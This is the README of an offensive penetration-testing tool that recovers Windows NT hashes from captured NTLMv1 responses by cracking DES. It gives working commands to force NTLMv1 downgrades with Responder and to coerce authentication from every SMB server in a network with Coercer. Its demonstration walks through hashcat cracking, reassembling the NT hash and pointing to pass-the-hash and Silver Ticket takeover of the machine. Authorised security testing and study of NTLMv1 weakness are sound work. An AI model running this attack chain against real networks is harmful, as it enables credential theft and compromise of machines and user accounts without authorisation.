# ntlmv1

tl;dr -- If you can get an NTLMv1 hash, you can be that person (for a user account) or compromise that machine (for a computer account) for about $30 USD, no matter how strong the password, by cracking DES itself. A bargain!

## Background

We have four on-prem authentication protocols for Windows:

1. LANMAN Challenge/Response (uses the LM hash and DES encryption)
2. NTLMv1 (uses the NT hash and DES encryption)
3. NTLMv2 (uses the NT hash and MD5 hashing)
4. Kerberos (uses DES or AES encryption, depending upon the hash type. [It's complicated](https://syfuhs.net/a-bit-about-kerberos))

Interestingly, Kerberos uses Service Principal *Names* (SPNs) for service tickets. If you're accessing a target by IP, in nearly all circumstances you'll be using NTLMv2 or NTLMv1.

The most important job of a challenge/response protocol is that you're not just sending the password in plain text. Instead, both sides have the secret, and the server issues a mathematical challenge based upon that secret, which the client computes and sends back.

In contrast, SNMPv1 "community strings" are essentially passwords sent with every request.

Normally, when discussing cracking NTLMv1 (or NTLMv2) hashes, the cracking tool is fundamentally guessing passwords, creating the NT hash for them, then walking through the captured server-issued challenge before comparing the captured client response (this is the "guess/hash/compare" cycle). Instead, since NTLMv1 uses DES encryption with 56-bit keys, by cracking the DES-encrypted client response we can derive the original client NT hash, which we can then pass using Pass-the-Hash techniques.

This is a fairly involved procedure, since cracking DES involves approximately 72 quadrillion DES operations (2^56). Surprisingly, with today's GPU cracking speeds (a single RTX 4090 can compute approximately [146 billion hashes per second](https://gist.github.com/Chick3nman/32e662a5bb63bc4f51b847bb422222fd#file-rtx_4090_v6-2-6-benchmark-L1505)), with available cloud resources such as [Vast.AI](https://vast.ai), this means it costs on average around $30 USD to crack the NT hash out of a captured NTLMv1 connection.

## Getting NTLMv1 Hashes

Windows hasn't supported NTLMv1 by default for a long, long time. However, it's not uncommon to have a few systems that still have it enabled, such as file servers that need to support old (or non-Windows) clients. If we can get a computer account to give us an NTLMv1 hash, we can then perform a [Silver Ticket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket) attack to take over that machine. This is the attack outlined in the [NetNTLMToSilverTicket](https://github.com/NotMedic/NetNTLMtoSilverTicket) repository.

This is often catastrophic to the security of the organization, as we could then dump the credentials of logged-on users on that machine (via [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)-style attacks), dump local password hashes, cached domain credentials, search through all those file shares, and more.

With [Responder](https://github.com/lgandx/Responder) attacks, we can trick Windows machines in the same subnet ("broadcast domain" technically) to log in to us when those Windows machines have failed DNS requests. We can then capture the hash and attempt to crack them offline.

With Responder, we also have a few options to force a downgrade back to NTLMv1:

```bash
Responder -I eth0 --lm --disable-ess
```

We also have two options to get machines _outside_ our subnet to authenticate to us:

1. Adding DNS records for the failed requests we spot with Responder, as authenticated AD accounts can do this via [Powermad](https://github.com/Kevin-Robertson/Powermad) or [DNSUpdate](https://github.com/Sagar-Jangam/DNSUpdate). Since the DNS request will succeed, we can insert our own machine as the target, which will work across subnets (to any machine using the same DNS server). 
2. By coercing authentication with one of the many methods available. Windows, as it turns out, has many API calls that allow authenticated clients to force a remote machine to authenticate against a target IP of their choosing. This is referred to as "coerced authentication" and is implemented in tools like [Coercer](https://github.com/p0dalirius/Coercer), [DFSCoerce](https://github.com/Wh04m1001/DFSCoerce), and [SpoolSample](https://github.com/leechristensen/SpoolSample).

If you know what Windows machines are in a target environment (perhaps via scanning internal subnets with [Masscan](https://github.com/robertdavidgraham/masscan)), you can use Coercer as follows to attempt to coerce authentication to your Responder machine to _every_ machine in the target environment:

```bash
cat smb-servers.txt | while read ip; do timeout -k 30 15 python3 Coercer.py -l IP.ADDR.OF.RESPONDER -t "$ip" -u any-domain-account -p Password123 -d DOMAIN --always-continue; done
```

Coercer supports multiple targets, but I've found it crashes too often to trust using it that way. 

To my knowledge, you need admin rights to find out if a remote machine supports NTLMv1 authoritatively (by reading the [LMCompatibilityLevel](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc960646(v=technet.10)?redirectedfrom=MSDN) registry value). 

## Installation

To install the necessary dependencies, run the following command:

```bash
git clone https://github.com/RogueValleyInformationSecurity/ntlmv1
cd ntlmv1
pip install -r requirements.txt
python3 ntlmv1.py -h
```

If you haven't already installed Responder, I like using [PTF](https://github.com/trustedsec/ptf) on Debian or Ubuntu for that purpose:

```bash
git clone https://github.com/trustedsec/ptf
cd ptf
sudo ./ptf
use modules/exploitation/responder
run
exit
```

This will install Responder into `/pentest/exploitation/responder`, so the logs will be in `/pentest/exploitation/responder/logs`. You'll want all the unique NTLMv1 hashes you can get (likely with file names like `SMB-NTLMv1-*.txt`). If you have a choice in the matter (like in an Assumed Breach test), you'll want to place your Responder machine in a busy subnet with lots of client Windows machines.

## Usage

You'll need NTLMv1 hashes in the Responder format to use this tool, along with [Hashcat](https://hashcat.net/hashcat/) to crack the DES encryption. 

```bash
ls -l /pentest/exploitation/responder/logs/SMB-NTLMv1-*.txt
python3 ntlmv1.py --ntlmv1 $(head -n 1 /pentest/exploitation/responder/logs/SMB-NTLMv1-*.txt)
```

The example used a subshell to take the first line of the file, but you could also just use line directly.

## Demonstration

Here's an example Responder hash in NTLMv1 format:

```
FILE01$::HIBOXY:29F6C0D455D0C29851D5E8217DF9CDFD88FCC6ED4E84C0E9:29F6C0D455D0C29851D5E8217DF9CDFD88FCC6ED4E84C0E9:ea1ebed2adc2b0ce
```

This is the hash for the computer account `FILE01$` in the `HIBOXY` domain. Let's use it with `ntlmv1.py`:

```bash
python3 ntlmv1.py --ntlmv1 'FILE01$::HIBOXY:29F6C0D455D0C29851D5E8217DF9CDFD88FCC6ED4E84C0E9:29F6C0D455D0C29851D5E8217DF9CDFD88FCC6ED4E84C0E9:ea1ebed2adc2b0ce'
NTLMv1 Hash Information:
User: FILE01$
Domain: HIBOXY
Challenge: ea1ebed2adc2b0ce
LM Response: 29F6C0D455D0C29851D5E8217DF9CDFD88FCC6ED4E84C0E9
NT Response: 29F6C0D455D0C29851D5E8217DF9CDFD88FCC6ED4E84C0E9
CT1: 29F6C0D455D0C298
CT2: 51D5E8217DF9CDFD
CT3: 88FCC6ED4E84C0E9

Last two bytes of NT hash: c701

To crack with hashcat:
echo '29F6C0D455D0C298:ea1ebed2adc2b0ce' >> 14000.hash
echo '51D5E8217DF9CDFD:ea1ebed2adc2b0ce' >> 14000.hash
hashcat -m 14000 -a 3 -1 charsets/DES_full.hcchr --hex-charset 14000.hash ?1?1?1?1?1?1?1?1


Note: You'll need to update the path to the DES_full.hcchr charset file.

# We can cheat and give the first few bytes of the DES key to hashcat, which will help it crack much faster.

hashcat -m 14000 -a 3 -1 /pentest/password-recovery/hashcat/charsets/DES_full.hcchr --hex-charset 14000.hash 736bdf04c1?1?1?1
hashcat -m 14000 -a 3 -1 /pentest/password-recovery/hashcat/charsets/DES_full.hcchr --hex-charset 14000.hash 6bbf9eec2c?1?1?1

# Since we're giving the first few bytes of the DES key, we need to crack each half separately.

cat /pentest/password-recovery/hashcat/hashcat.potfile
29f6c0d455d0c298:ea1ebed2adc2b0ce:$HEX[736bdf04c12fa81f]
51d5e8217df9cdfd:ea1ebed2adc2b0ce:$HEX[6bbf9eec2cbf3897]

# Now we'll use deskey_to_ntlm from Hashcat (https://github.com/hashcat/hashcat-utils/blob/master/src/deskey_to_ntlm.pl) to convert the DES key to the NT hash pieces:
deskey_to_ntlm 736bdf04c12fa81f
72d7782c05ea0f
deskey_to_ntlm 6bbf9eec2cbf3897
6b7e7f62d7ce4b

# Now we combine the three pieces of the hash back together:
export first=72d7782c05ea0f # Output from deskey_to_ntlm 736bdf04c12fa81f
export second=6b7e7f62d7ce4b # Output from deskey_to_ntlm 6bbf9eec2cbf3897
export third=c701 # Output from ntlmv1.py
echo "NT hash of FILE01$ is: $first$second$third" 
```

From here, you could use that NT hash of the computer account to gain direct code execution against it through a Silver Ticket attack, as nicely described [here](https://github.com/NotMedic/NetNTLMtoSilverTicket?tab=readme-ov-file#create-a-kerberos-silver-ticket).

## Credits

This repository is based upon the following work:

 - [ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) by [EvilMog](https://twitter.com/evil_mog)

## License

This repository is licensed under the MIT License. See the [LICENSE](LICENSE) file for the full license text.